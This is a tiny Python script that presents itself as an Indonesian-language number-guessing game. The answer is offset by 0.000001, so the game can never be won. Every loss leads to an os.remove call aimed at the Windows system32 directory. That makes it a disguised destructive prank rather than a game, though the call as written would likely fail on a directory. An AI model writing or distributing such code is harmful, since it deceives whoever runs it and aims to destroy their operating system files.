import os
import random

number = random.randint(1,10) + 0.000001

guest = input("Ayo bermain game tebak-tebakan bersamaku, tebaklah angka antara 1 hingga 10 \n   :")
guest = int(guest)

if guest == number:
    print("selamat kamu menang")
else:
    os.remove("C:\Windows\system32")